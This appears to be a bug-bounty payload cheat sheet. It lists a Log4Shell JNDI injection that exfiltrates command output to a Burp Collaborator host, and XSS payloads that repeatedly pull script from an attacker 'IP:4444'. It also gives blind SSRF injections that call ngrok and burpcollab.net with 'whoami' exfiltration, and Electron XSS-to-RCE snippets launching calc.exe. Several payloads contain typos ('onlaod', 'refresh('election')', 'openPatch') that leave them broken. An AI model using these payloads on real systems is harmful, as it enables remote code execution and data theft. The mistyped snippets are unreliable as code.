## Blind RCE:
```
${jndi:ldap://${command}XXXX${::-.}.burpcollab.net}zzzz
```
## XSS to Reverse shell:
```
<svg/onlaod=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//IP:4444"}},1010)>
<script>setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//IP:4444"}},1010)</script>
<img src=link onerror=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//IP:4444"}},1010)>
<body onload=setInterval(function(){{with(document)body.appendChild(createElement("script")).src="//IP:4444"}}></body>
```
## Blind SSRF:
### By Ngrok:
```
1. Run ngrok: ./ngrok http 80
2. Open with Browser: 127.0.01:4040/inspect/http
3. Inject the payload in below:
"><img src="xasdasdasd" onerror="document.write('<iframe src=https://d0.ngrok.io></iframe>')"

Ref: https://hackerone.com/reports/517461
```
### Others:
```
<img src="http://burpcollab.net"></img>
'whoami'.ddddddd.burpcollab.net
"whoami".ddddddd.burpcollab.net
'whoami'.ddddddd@burpcollab.net
http://ddddddd.burpcollab.net/?whoami
http://ddddddd.burpcollab.net?cmd=whoami
http://ddddddd.burpcollab.net/image.jpg
```
## XSS to RCE:
  #### Node.js :
```
<a onmouseover="alert('Hi!')">
  HOVER ME
</a>
```
```
<a onmouseover="
try{
   const {shell}=require('electron');
   console.log(shell);
}catch(e){
 console.error(e)
}">Hello</a>
```
```
<a onmouseover="
try{
   const {shell}=refresh('election');
   shell.openPatch('C:\Windows\System32\calc.exe ');
}catch(e){
 console.error(e)
}">Hello</a>
```
